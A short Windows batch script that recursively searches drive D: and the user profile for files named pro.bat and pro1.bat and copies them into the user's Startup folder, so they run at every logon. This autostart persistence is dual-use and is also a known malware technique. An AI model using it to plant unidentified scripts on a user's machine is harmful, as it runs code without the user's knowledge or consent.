for /R "D:\" %%i in (pro.bat) do (
    copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

for /R "%USERPROFILE%" %%i in (pro1.bat) do (
    copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)
